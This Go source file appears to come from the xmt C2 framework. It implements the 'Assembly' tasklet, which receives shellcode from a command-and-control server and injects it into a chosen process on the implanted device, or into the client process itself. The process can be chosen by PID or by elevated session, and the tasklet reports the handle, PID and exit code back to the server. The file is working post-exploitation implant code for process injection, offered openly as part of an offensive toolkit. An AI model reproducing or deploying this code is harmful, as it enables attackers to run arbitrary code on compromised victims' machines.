// Copyright (C) 2020 - 2022 iDigitalFlame
//
// This program is free software: you can redistribute it and/or modify
// it under the terms of the GNU General Public License as published by
// the Free Software Foundation, either version 3 of the License, or
// any later version.
//
// This program is distributed in the hope that it will be useful,
// but WITHOUT ANY WARRANTY; without even the implied warranty of
// MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
// GNU General Public License for more details.
//
// You should have received a copy of the GNU General Public License
// along with this program.  If not, see <https://www.gnu.org/licenses/>.
//

package task

import (
	"context"
	"time"

	"github.com/iDigitalFlame/xmt/cmd"
	"github.com/iDigitalFlame/xmt/cmd/filter"
	"github.com/iDigitalFlame/xmt/data"
)

// Assembly is a Tasklet that is similar to the 'cmd.Assembly' struct.
//
// This struct is used to Task a Client with running shellcode on devices. It
// has many of the functionalities matching the 'cmd.Assembly' struct.
//
// This can be directly used in the Session 'Tasklet' function instead of
// directly creating a Task.
//
// The 'SetParent' function will attempt to set the target that runs the
// shellcode. If none are specified, the shellcode will be injected into the
// client process.
//
// C2 Details:
//
//	ID: TvAssembly
//
//	Input:
//	    Assembly struct {
//	        bool            // Wait
//	        int64           // Timeout
//	        bool            // Filter Status
//	        Filter struct { // Filter
//	            uint32      // PID
//	            bool        // Fallback
//	            uint8       // Session
//	            uint8       // Elevated
//	            []string    // Exclude
//	            []string    // Include
//	        }
//	        []byte          // Assembly Data
//	    }
//	Output:
//	    uint64              // Handle
//	    uint32              // PID
//	    int32               // Exit Code
type Assembly struct {
	Filter  *filter.Filter
	Data    []byte
	Timeout time.Duration
	Wait    bool
}

// UnmarshalStream reads the data for this Code thread from the supplied Reader.
func (a *Assembly) UnmarshalStream(r data.Reader) error {
	if err := r.ReadBool(&a.Wait); err != nil {
		return err
	}
	if err := r.ReadInt64((*int64)(&a.Timeout)); err != nil {
		return err
	}
	if err := filter.UnmarshalStream(r, &a.Filter); err != nil {
		return err
	}
	return r.ReadBytes(&a.Data)
}
func taskAssembly(x context.Context, r data.Reader, w data.Writer) error {
	a, z, err := AssemblyUnmarshal(x, r)
	if err != nil {
		return err
	}
	if err = a.Start(); err != nil {
		return err
	}
	h, _ := a.Handle()
	if w.WriteUint64(uint64(h)); !z {
		w.WriteUint64(uint64(a.Pid()) << 32)
		a.Release()
		return nil
	}
	w.WriteUint32(a.Pid())
	err = a.Wait()
	if _, ok := err.(*cmd.ExitError); err != nil && !ok {
		return err
	}
	e, _ := a.ExitCode()
	w.WriteInt32(e)
	return nil
}

// AssemblyUnmarshal will read this Assembly's struct data from the supplied
// reader and returns an Assembly runnable struct along with the wait boolean.
//
// This function returns an error if building or reading fails.
func AssemblyUnmarshal(x context.Context, r data.Reader) (*cmd.Assembly, bool, error) {
	var (
		a   Assembly
		err = a.UnmarshalStream(r)
	)
	if err != nil {
		return nil, false, err
	}
	if len(a.Data) == 0 {
		return nil, false, cmd.ErrEmptyCommand
	}
	v := cmd.NewAsmContext(x, a.Data)
	v.Timeout = a.Timeout
	v.SetParent(a.Filter)
	return v, a.Wait, nil
}
